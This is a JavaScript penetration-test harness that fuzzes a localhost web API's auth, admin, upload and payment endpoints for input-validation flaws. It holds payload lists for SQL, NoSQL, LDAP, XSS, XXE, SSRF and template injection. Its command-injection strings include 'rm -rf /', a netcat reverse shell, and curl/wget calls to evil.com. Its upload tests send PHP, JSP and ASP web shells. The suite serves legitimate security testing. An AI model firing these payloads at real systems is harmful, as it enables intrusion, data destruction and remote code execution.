/**
 * API Fuzzing and Input Validation Penetration Tests
 * Comprehensive testing for input validation vulnerabilities
 */

const crypto = require('crypto');
const fs = require('fs');

class APIFuzzingTests {
  constructor(baseUrl = 'http://localhost:3000') {
    this.baseUrl = baseUrl;
    this.findings = [];
    this.requestLog = [];
  }

  logFinding(severity, type, description, evidence = {}) {
    this.findings.push({
      timestamp: new Date().toISOString(),
      severity,
      type,
      description,
      evidence
    });
    console.log(`[${severity}] ${type}: ${description}`);
  }

  logRequest(method, url, payload, response) {
    this.requestLog.push({
      timestamp: new Date().toISOString(),
      method,
      url,
      payload,
      status: response.status,
      headers: Object.fromEntries(response.headers.entries()),
      body: response.body
    });
  }

  /**
   * Generate malicious payloads for different types of attacks
   */
  generatePayloads() {
    return {
      // Buffer overflow attempts
      bufferOverflow: [
        'A'.repeat(1000),
        'A'.repeat(10000),
        'A'.repeat(100000),
        'A'.repeat(1000000)
      ],
      
      // Format string attacks
      formatString: [
        '%s%s%s%s%s%s%s%s',
        '%x%x%x%x%x%x%x%x',
        '%n%n%n%n%n%n%n%n',
        '%.1000d%.1000d%.1000d'
      ],
      
      // SQL Injection payloads
      sqlInjection: [
        "'; DROP TABLE users; --",
        "' OR '1'='1' --",
        "' UNION SELECT * FROM users --",
        "' AND (SELECT COUNT(*) FROM users) > 0 --",
        "'; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'password'); --",
        "' OR 1=1 #",
        "admin'--",
        "admin'/*",
        "' OR 'x'='x",
        "') OR ('x')=('x",
        "' OR 1=1--",
        "' OR 'x'='x'--",
        "') OR 1=1--",
        "' OR EXISTS(SELECT * FROM users WHERE username='admin')--"
      ],
      
      // NoSQL Injection payloads
      nosqlInjection: [
        '{"$ne": ""}',
        '{"$regex": ".*"}',
        '{"$where": "this.password.length > 0"}',
        '{"$gt": ""}',
        '{"$lt": ""}',
        '{"$exists": true}',
        '{"$in": ["admin", "root", "administrator"]}',
        '{"$or": [{"username": "admin"}, {"email": "admin@admin.com"}]}',
        '{"$and": [{"username": {"$ne": ""}}, {"password": {"$ne": ""}}]}'
      ],
      
      // LDAP Injection payloads
      ldapInjection: [
        '*)(uid=*',
        '*)(|(objectClass=*))',
        '*)(&(password=*))',
        '*))%00',
        '*(|(password=*))',
        '*)(&(objectClass=user))',
        '*)(cn=*'
      ],
      
      // XSS payloads
      xss: [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg/onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<body onload=alert("XSS")>',
        '<input autofocus onfocus=alert("XSS")>',
        '<select onfocus=alert("XSS") autofocus>',
        '<textarea autofocus onfocus=alert("XSS")>',
        '<keygen autofocus onfocus=alert("XSS")>',
        '<video><source onerror="alert(\'XSS\')">',
        '<audio src=x onerror=alert("XSS")>',
        '<details open ontoggle=alert("XSS")>',
        '<marquee onstart=alert("XSS")>'
      ],
      
      // Command injection payloads
      commandInjection: [
        '; ls -la',
        '&& cat /etc/passwd',
        '| whoami',
        '; rm -rf /',
        '`id`',
        '$(whoami)',
        '; nc -l -p 4444 -e /bin/sh',
        '&& curl http://evil.com/`whoami`',
        '; wget http://evil.com/shell.sh',
        '| nc evil.com 4444'
      ],
      
      // Path traversal payloads
      pathTraversal: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '....//....//....//etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '..%252F..%252F..%252Fetc%252Fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '/var/www/../../etc/passwd',
        'file:///etc/passwd',
        '\\\\localhost\\c$\\windows\\system32\\drivers\\etc\\hosts'
      ],
      
      // XML/XXE payloads
      xxe: [
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM \'file:///c:/boot.ini\'>]><root>&test;</root>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]><foo></foo>'
      ],
      
      // SSRF payloads
      ssrf: [
        'http://localhost:22',
        'http://127.0.0.1:3306',
        'http://169.254.169.254/latest/meta-data/',
        'file:///etc/passwd',
        'gopher://127.0.0.1:3306/',
        'dict://127.0.0.1:11211/',
        'ftp://127.0.0.1/',
        'sftp://127.0.0.1/'
      ],
      
      // Template injection payloads
      templateInjection: [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '{{config.items()}}',
        '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',
        '${{7*7}}',
        '#{7*7}',
        '%{7*7}'
      ],
      
      // Special characters and encoding
      specialChars: [
        '\x00\x01\x02\x03\x04\x05',
        '\n\r\t',
        '\u0000\u0001\u0002',
        '%00%01%02%03',
        '\\\'\\"',
        '\\x41\\x42\\x43',
        String.fromCharCode(0, 1, 2, 3, 4, 5),
        '\uFEFF', // BOM
        '\u202E' // Right-to-left override
      ]
    };
  }

  /**
   * Test input validation on authentication endpoints
   */
  async testAuthEndpoints() {
    console.log('\n🔍 Testing Authentication Endpoint Input Validation...');
    
    const payloads = this.generatePayloads();
    const authEndpoints = [
      { path: '/api/auth/login', method: 'POST' },
      { path: '/api/auth/register', method: 'POST' },
      { path: '/api/auth/forgot-password', method: 'POST' },
      { path: '/api/auth/reset-password', method: 'POST' },
      { path: '/api/auth/verify-email', method: 'POST' }
    ];
    
    for (const endpoint of authEndpoints) {
      console.log(`Testing ${endpoint.path}...`);
      
      // Test each payload type
      for (const [payloadType, payloadList] of Object.entries(payloads)) {
        for (const payload of payloadList.slice(0, 3)) { // Limit to first 3 for performance
          const testData = {
            email: payload,
            password: payload,
            firstName: payload,
            lastName: payload,
            token: payload,
            newPassword: payload,
            confirmPassword: payload
          };
          
          try {
            const response = await fetch(this.baseUrl + endpoint.path, {
              method: endpoint.method,
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(testData)
            });
            
            const responseText = await response.text();
            this.logRequest(endpoint.method, endpoint.path, testData, response);
            
            // Check for potential vulnerabilities
            await this.analyzeResponse(endpoint.path, payload, payloadType, response, responseText);
            
          } catch (error) {
            // Network errors might indicate successful DoS
            if (error.code === 'ECONNRESET' || error.code === 'ETIMEDOUT') {
              this.logFinding('HIGH', 'Potential DoS', 
                `Network error with payload type ${payloadType} on ${endpoint.path}`,
                { payload: payload.substring(0, 100), error: error.message });
            }
          }
        }
      }
    }
  }

  /**
   * Test feature gating and role-based endpoints
   */
  async testFeatureEndpoints() {
    console.log('\n🔍 Testing Feature Endpoint Input Validation...');
    
    const payloads = this.generatePayloads();
    const featureEndpoints = [
      { path: '/api/features/analytics', method: 'GET' },
      { path: '/api/features/reports', method: 'POST' },
      { path: '/api/admin/users', method: 'GET' },
      { path: '/api/admin/feature-toggles', method: 'POST' },
      { path: '/api/superadmin/system', method: 'GET' },
      { path: '/api/business/valuation', method: 'POST' },
      { path: '/api/payments/process', method: 'POST' }
    ];
    
    for (const endpoint of featureEndpoints) {
      console.log(`Testing ${endpoint.path}...`);
      
      // Test with various malicious headers
      const maliciousHeaders = {
        'X-Forwarded-For': '127.0.0.1',
        'X-Real-IP': '127.0.0.1',
        'X-Originating-IP': '127.0.0.1',
        'X-Remote-IP': '127.0.0.1',
        'X-Remote-Addr': '127.0.0.1',
        'X-ProxyUser-IP': '127.0.0.1',
        'X-Original-URL': '/admin',
        'X-Rewrite-URL': '/admin',
        'User-Agent': '<script>alert("XSS")</script>',
        'Referer': 'javascript:alert("XSS")',
        'Host': 'evil.com'
      };
      
      try {
        const response = await fetch(this.baseUrl + endpoint.path, {
          method: endpoint.method,
          headers: {
            'Content-Type': 'application/json',
            ...maliciousHeaders
          },
          body: endpoint.method === 'POST' ? JSON.stringify({
            data: '<script>alert("XSS")</script>',
            query: '\'; DROP TABLE users; --',
            filter: '{"$ne": ""}'
          }) : undefined
        });
        
        const responseText = await response.text();
        
        // Check if malicious content is reflected
        if (responseText.includes('<script>') || responseText.includes('alert(')) {
          this.logFinding('HIGH', 'XSS Vulnerability', 
            `Potential XSS in ${endpoint.path}`,
            { endpoint: endpoint.path, response: responseText.substring(0, 200) });
        }
        
      } catch (error) {
        // Expected for most cases
      }
    }
  }

  /**
   * Test file upload vulnerabilities
   */
  async testFileUpload() {
    console.log('\n🔍 Testing File Upload Vulnerabilities...');
    
    const maliciousFiles = {
      'php_webshell.php': '<?php system($_GET["cmd"]); ?>',
      'jsp_webshell.jsp': '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
      'asp_webshell.asp': '<%eval request("cmd")%>',
      'html_xss.html': '<script>alert("XSS")</script>',
      'svg_xss.svg': '<svg onload="alert(\'XSS\')"></svg>',
      'exe_malware.exe': '\x4d\x5a\x90\x00', // PE header
      'script.bat': '@echo off\necho "Malicious batch file"',
      'script.sh': '#!/bin/bash\necho "Malicious shell script"'
    };
    
    const uploadEndpoints = [
      '/api/upload/avatar',
      '/api/upload/document',
      '/api/upload/business-logo',
      '/api/admin/upload'
    ];
    
    for (const endpoint of uploadEndpoints) {
      for (const [filename, content] of Object.entries(maliciousFiles)) {
        try {
          const formData = new FormData();
          const blob = new Blob([content], { type: 'application/octet-stream' });
          formData.append('file', blob, filename);
          
          const response = await fetch(this.baseUrl + endpoint, {
            method: 'POST',
            body: formData
          });
          
          if (response.status === 200) {
            const responseData = await response.text();
            if (responseData.includes('success') || responseData.includes('uploaded')) {
              this.logFinding('CRITICAL', 'Malicious File Upload', 
                `Successfully uploaded malicious file: ${filename}`,
                { endpoint, filename, fileType: filename.split('.').pop() });
            }
          }
          
        } catch (error) {
          // Expected for most cases
        }
      }
    }
  }

  /**
   * Test for race conditions and concurrent access issues
   */
  async testRaceConditions() {
    console.log('\n🔍 Testing Race Conditions...');
    
    const sensitiveEndpoints = [
      '/api/auth/upgrade-to-pro',
      '/api/payments/process',
      '/api/user/change-password',
      '/api/admin/create-user'
    ];
    
    for (const endpoint of sensitiveEndpoints) {
      const promises = [];
      
      // Send multiple concurrent requests
      for (let i = 0; i < 50; i++) {
        const promise = fetch(this.baseUrl + endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            action: 'test_race_condition',
            timestamp: Date.now(),
            request_id: i
          })
        }).catch(() => {}); // Ignore network errors
        
        promises.push(promise);
      }
      
      try {
        const responses = await Promise.all(promises);
        const successfulResponses = responses.filter(r => r && r.status === 200);
        
        if (successfulResponses.length > 1) {
          this.logFinding('MEDIUM', 'Race Condition', 
            `Multiple concurrent requests succeeded on ${endpoint}`,
            { endpoint, successCount: successfulResponses.length });
        }
      } catch (error) {
        // Expected
      }
    }
  }

  /**
   * Analyze response for potential vulnerabilities
   */
  async analyzeResponse(endpoint, payload, payloadType, response, responseText) {
    // Check for error messages that might leak information
    const sensitivePatterns = [
      /sql.*error/i,
      /mysql.*error/i,
      /postgresql.*error/i,
      /database.*error/i,
      /stack trace/i,
      /internal server error/i,
      /debug.*info/i,
      /file not found/i,
      /permission denied/i,
      /access denied/i,
      /invalid.*query/i,
      /syntax.*error/i
    ];
    
    for (const pattern of sensitivePatterns) {
      if (pattern.test(responseText)) {
        this.logFinding('MEDIUM', 'Information Disclosure', 
          `Sensitive error information exposed on ${endpoint}`,
          { 
            endpoint,
            payloadType,
            payload: payload.substring(0, 50),
            errorPattern: pattern.source,
            response: responseText.substring(0, 300)
          });
        break;
      }
    }
    
    // Check for reflected payload (potential XSS)
    if (responseText.includes(payload) && payload.includes('<script>')) {
      this.logFinding('HIGH', 'Reflected XSS', 
        `Payload reflected in response on ${endpoint}`,
        { 
          endpoint,
          payload: payload.substring(0, 100),
          response: responseText.substring(0, 200)
        });
    }
    
    // Check for unusually long response times (potential DoS)
    const responseTime = response.headers.get('x-response-time');
    if (responseTime && parseInt(responseTime) > 5000) {
      this.logFinding('MEDIUM', 'Potential DoS', 
        `Slow response time on ${endpoint}`,
        { endpoint, responseTime, payloadType });
    }
    
    // Check for status codes that might indicate vulnerabilities
    if (response.status === 500 && payloadType === 'sqlInjection') {
      this.logFinding('HIGH', 'Potential SQL Injection', 
        `Server error with SQL injection payload on ${endpoint}`,
        { endpoint, payload: payload.substring(0, 100), status: response.status });
    }
  }

  /**
   * Run all fuzzing tests
   */
  async runAllTests() {
    console.log('🚀 Starting API Fuzzing and Input Validation Tests');
    console.log('=' * 60);
    
    await this.testAuthEndpoints();
    await this.testFeatureEndpoints();
    await this.testFileUpload();
    await this.testRaceConditions();
    
    this.generateReport();
  }

  /**
   * Generate fuzzing test report
   */
  generateReport() {
    console.log('\n📊 API FUZZING TEST REPORT');
    console.log('=' * 60);
    
    const severityCounts = this.findings.reduce((acc, finding) => {
      acc[finding.severity] = (acc[finding.severity] || 0) + 1;
      return acc;
    }, {});
    
    console.log(`Total Findings: ${this.findings.length}`);
    console.log(`Total Requests: ${this.requestLog.length}`);
    console.log(`Critical: ${severityCounts.CRITICAL || 0}`);
    console.log(`High: ${severityCounts.HIGH || 0}`);
    console.log(`Medium: ${severityCounts.MEDIUM || 0}`);
    console.log(`Low: ${severityCounts.LOW || 0}`);
    
    // Group findings by type
    const findingsByType = this.findings.reduce((acc, finding) => {
      acc[finding.type] = (acc[finding.type] || 0) + 1;
      return acc;
    }, {});
    
    console.log('\n🎯 Findings by Type:');
    Object.entries(findingsByType).forEach(([type, count]) => {
      console.log(`  ${type}: ${count}`);
    });
    
    // Save detailed log
    this.saveDetailedLog();
  }

  /**
   * Save detailed test log to file
   */
  saveDetailedLog() {
    const logData = {
      summary: {
        totalFindings: this.findings.length,
        totalRequests: this.requestLog.length,
        timestamp: new Date().toISOString()
      },
      findings: this.findings,
      requestLog: this.requestLog.slice(-100) // Keep last 100 requests
    };
    
    try {
      fs.writeFileSync(
        'security/penetration-tests/fuzzing-test-results.json',
        JSON.stringify(logData, null, 2)
      );
      console.log('\n💾 Detailed log saved to fuzzing-test-results.json');
    } catch (error) {
      console.error('Failed to save log:', error.message);
    }
  }
}

module.exports = APIFuzzingTests;

// Usage
if (require.main === module) {
  const testSuite = new APIFuzzingTests('http://localhost:3000');
  testSuite.runAllTests().catch(console.error);
}